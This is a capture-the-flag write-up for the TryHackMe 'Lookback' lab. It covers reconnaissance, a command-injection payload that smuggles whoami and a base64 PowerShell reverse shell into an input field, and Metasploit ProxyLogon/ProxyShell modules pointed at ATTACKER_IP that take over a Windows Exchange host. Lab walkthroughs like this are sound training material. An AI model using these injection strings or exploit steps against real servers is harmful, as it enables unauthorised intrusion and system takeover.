# 📋 Lookback

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Lookback](https://tryhackme.com/room/lookback) |
| **Difficulty** | 🟡 Medium |
| **Category** | Web, Windows |
| **OS** | Windows (Microsoft Exchange / IIS) |
| **Tools** | nmap, ffuf, Nikto, Metasploit, revshells.com |

---

## 🎯 Objective

Compromise a Windows machine running Microsoft Exchange — find 3 flags by exploiting a command injection vulnerability and escalating via Exchange CVEs.

---

## 🔍 Reconnaissance

```bash
nmap -p- -Pn TARGET_IP -T5 -A
```

**Open ports:**
```
80/tcp   open  http        Microsoft IIS 10.0
443/tcp  open  https       Microsoft IIS 10.0
3389/tcp open  ms-wbt-server (RDP)
```

Check the SSL certificate on port 443 — extract the hostname:
```
commonName=WIN-12OUO7A66M7
```

Add to `/etc/hosts`:
```bash
echo "TARGET_IP WIN-12OUO7A66M7.thm.local" >> /etc/hosts
```

Navigate to `https://WIN-12OUO7A66M7.thm.local` — an Exchange login page appears.

---

## 🌐 Web Enumeration

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u https://WIN-12OUO7A66M7.thm.local/FUZZ -fs 0

# Found: /test
```

Navigate to `/test` — prompts for credentials. Run Nikto to find default creds:

```bash
nikto -host TARGET_IP
```

Default credentials found — log in to `/test`.

---

## 💥 Exploitation — Command Injection

The `/test` page contains an input box. Test for command injection:

```
') | whoami ('
# Returns: iis apppool\defaultapppool
```

Command injection confirmed. Generate a PowerShell reverse shell at **revshells.com** and trigger it:

```
') | powershell -e BASE64_ENCODED_SHELL ('
```

Shell received. Navigate to find flags:

```bash
# Flag 1 (service user flag) — in /test directory
# Flag 2 (user flag) — check /dev/user.txt and /dev/TODO.txt
type C:\dev\user.txt
type C:\dev\TODO.txt
```

`TODO.txt` reveals Microsoft Exchange is running.

---

## 🔐 Privilege Escalation — Exchange CVE via Metasploit

```bash
msfconsole

search exchange
# Use exchange ProxyLogon or ProxyShell exploit
use exploit/windows/http/exchange_proxylogon_rce
# or
use exploit/windows/http/exchange_proxyshell_rce

set RHOSTS WIN-12OUO7A66M7.thm.local
set LHOST ATTACKER_IP
set EMAIL admin@thm.local
run
```

Meterpreter session opened — navigate to Administrator directory:

```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

**Flag 3 captured.**

---

## 📚 Lessons Learned

- Always check SSL certificates — they reveal hostnames that must be added to `/etc/hosts`
- Nikto finds default credentials on web applications automatically
- Command injection via log viewer inputs is a classic Windows web vulnerability
- Microsoft Exchange has multiple critical CVEs (ProxyLogon, ProxyShell) — always check the version
- `TODO.txt` and notes left by developers are valuable intel during post-exploitation

---
*by OwlRC 🦉 | github.com/OwlRC*
